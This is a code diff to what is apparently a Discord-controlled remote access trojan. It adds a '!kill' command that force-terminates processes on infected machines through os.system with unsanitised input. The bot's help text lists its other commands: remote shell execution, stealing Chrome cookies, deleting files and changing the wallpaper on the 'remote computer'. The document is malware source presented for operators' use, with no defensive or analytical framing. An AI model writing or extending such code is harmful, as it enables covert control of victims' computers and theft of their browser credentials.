@@ -427,6 +427,18 @@ while True:
                     await ctx.send(f"wallpaper changed successfully")
         
         @bot.command()
+        async def kill(ctx, session, *args):
+            if session == "all":
+                task = " ".join(args)
+                os.system(f"taskkill /f /im {task}")
+                await ctx.send(f"task {task} killed successfull")
+            else:
+                if session == sesja:
+                    task = " ".join(args)
+                    os.system(f"taskkill /f /im {task}")
+                    await ctx.send(f"task {task} killed successfull")
+        
+        @bot.command()
         async def h(ctx):
             wiadomosc = '''
 !shell [session] [output(yes, no)] [command] - Executes a shell command on a remote computer.
@@ -454,6 +466,7 @@ while True:
 !chrome [session] [action(cookie)] - steals selected data from chrome
 !delete [session] [path] -  Deletes a file from the remote computer.
 !wallpaper [session] [path] -  changes the wallpaper on the remote computer.
+!kill [session] [task] - remote task killing.
             '''
             await ctx.send(wiadomosc)
 
